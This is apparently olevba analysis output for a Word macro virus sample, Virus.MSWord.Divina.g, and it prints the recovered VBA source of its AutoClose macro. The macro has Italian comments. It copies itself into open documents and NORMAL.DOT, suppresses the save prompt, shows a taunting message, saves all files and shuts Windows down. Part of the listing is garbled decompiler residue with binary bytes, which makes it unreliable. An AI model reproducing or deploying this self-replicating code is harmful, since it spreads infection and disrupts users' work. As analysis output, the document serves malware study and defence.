olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Divina.g-394cf6a76c39ef6f244bff2ce00465f0b1067598
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Divina.g-394cf6a76c39ef6f244bff2ce00465f0b1067598 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Divina.g-394cf6a76c39ef6f244bff2ce00465f0b1067598 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()

    Infezione

    WordBasic.Call "Effetti"

End Sub



Private Sub Infezione()
Dim fileattuale$
Dim dataeoraatt$
Dim dataeorasalv$
Dim dlg As Object
Dim macrodot$
Dim normaldot$
Dim trovata$
Dim NumeroMacro
Dim i
Dim macro$
Dim libcopia1$
Dim timer_

'** Salva come modello
'** Non rileva di essere in rete


'* memorizza in fileattuale il nome del doc aperto
'* continua se il doc è nuovo e non ha ancora un nome
    fileattuale$ = ""
    On Error Resume Next
    fileattuale$ = WordBasic.[FileName$]()

'* calcola data e ora e minuto dell ultimo salvataggio
    dataeoraatt$ = WordBasic.[Date$]() + " " + WordBasic.[Time$]()
    dataeorasalv$ = ""
    If fileattuale$ <> "" Then
        WordBasic.FileSummaryInfo FileName:=fileattuale$
            Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
            WordBasic.CurValues.FileSummaryInfo dlg
        dataeorasalv$ = dlg.LastSavedDate
    End If

'* se il minuto dell ultimo salvataggio è quello attuale
'* allora termina per non entrare in loop
'* termina anche se il documento è nuovo e non ancora salvato
'* o se è un file senza datasalvataggio, tipo un txt (che non sovrascrive)
    If dataeorasalv$ = dataeoraatt$ Or dataeorasalv$ = "" Then GoTo fine

'* trova dove è la macro
    macrodot$ = WordBasic.[MacroFileName$]("AutoClose")

'* trova path e disabilita la richiesta di salvataggio di normal
    normaldot$ = UCase(WordBasic.[DefaultDir$](2) + "\NORMAL.DOT")
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

'* controlla se ci è già una autoclose in normal
    trovata$ = "false"
    NumeroMacro = WordBasic.CountMacros()
    For i = 1 To NumeroMacro
        macro$ = WordBasic.[MacroName$](i, 0)
        If macro$ = "AutoClose" Then trovata$ = "true"
    Next i

'* copia la macro in fileattuale, salvandolo come modello, o in normal
'* va effettuata una sola copia o si ha errore (vedi: libcopia$="true")
    libcopia1$ = "false"
    If fileattuale$ <> "" And fileattuale$ <> normaldot$ And fileattuale$ <> macrodot$ Then
        WordBasic.FileSaveAs Format:=1
        WordBasic.Organizer Copy:=1, Source:=macrodot$, Destination:=fileattuale$, Name:="AutoClose", Tab:=3
        libcopia1$ = "true"
    End If
    If fileattuale$ <> "" And fileattuale$ <> normaldot$ And fileattuale$ = macrodot$ And libcopia1$ = "false" And trovata$ = "false" Then WordBasic.Organizer Copy:=1, Source:=fileattuale$, Destination:=normaldot$, Name:="AutoClose", Tab:=3

'*
' non implementato perchè sovrascrive una altra AutoClose in filedot
' ogni tanto copia la macro in un altro modello
'   min = Minute(Now())
'   filedot$ = ""
'   If min = 30 Or min = 45 Then filedot$ = Files$(DefaultDir$(2) + "\*.DOT")
'   If fil
6å‘4|ÈrØp
 WordBasic.ToolsGetSpelling    (          + <> WordBasic.ToolsGetSpelling( WordBasic.ToolsGetSpelling(                <> WordBasic.ToolsGetSpelling(    +    +  (Close         , Unrecognized_Argument43242 Mod <> WordBasic.ToolsGetSpelling( WordBasic.ToolsGetSpelling(   WordBasic.ToolsGetSpelling( WordBasic.Unrecognized_Statement29681 Then        WordBasic.ToolsGetSpelling    <>     Lib            Mod <> WordBasic.ToolsGetSpelling(    + * On   + End Goto   WordBasic.ToolsGetSpelling(      <>      WordBasic.PrintStatusBar  ))))))))))

6˜‹�Þæ©æz•
    'Next x
    WordBasic.Beep
WordBasic.MsgBox "Questo computer non è ben protetto contro i virus ..." + Chr(10) + "A presto !", "", 48

    WordBasic.ToggleFull
salvataggioRob:
    Err.Number = 0
    On Error GoTo -1: On Error GoTo salvataggioRob
    WordBasic.FileSaveAll 0

    For x = 1 To 2
        For timer_ = 1 To (1000 * x)
        Next timer_
    Next x
    WordBasic.Beep
riprendi:
    Err.Number = 0
    On Error GoTo -1: On Error GoTo riprendi
    WordBasic.ExitWindows

    'End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Divina.g-394cf6a76c39ef6f244bff2ce00465f0b1067598 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

